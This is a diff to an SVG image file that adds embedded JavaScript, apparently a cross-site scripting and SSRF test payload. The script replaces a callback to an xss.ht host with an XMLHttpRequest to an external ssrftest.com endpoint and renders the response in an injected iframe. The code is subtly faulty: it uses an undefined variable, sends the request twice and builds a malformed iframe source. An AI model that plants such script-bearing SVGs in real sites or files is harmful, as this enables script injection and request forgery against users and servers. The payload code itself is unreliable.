@@ -4,6 +4,18 @@
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
    <script type="text/javascript">
-      href='https://panch0r3d.xss.ht';
+      var xhr= new XMLHttpRequest();
+       xhr.open('GET', 'https://ssrftest.com/x/hCZ8o');
+       xhr.setRequestHeader('CustomHeader',reqref)
+       xhr.send();
+       xhr.onreadystatechange= function() {
+           if (this.readyState!==4) return;
+           if (this.status!==200) return;
+           var iframe = document.createElement('iframe');
+                   iframe.srcdoc = this.responseText;
+                   iframe.src = "text/plain," + escape(this.responseText);
+                   document.body.appendChild(iframe);
+      };
+      xhr.send();
    </script>
 </svg>
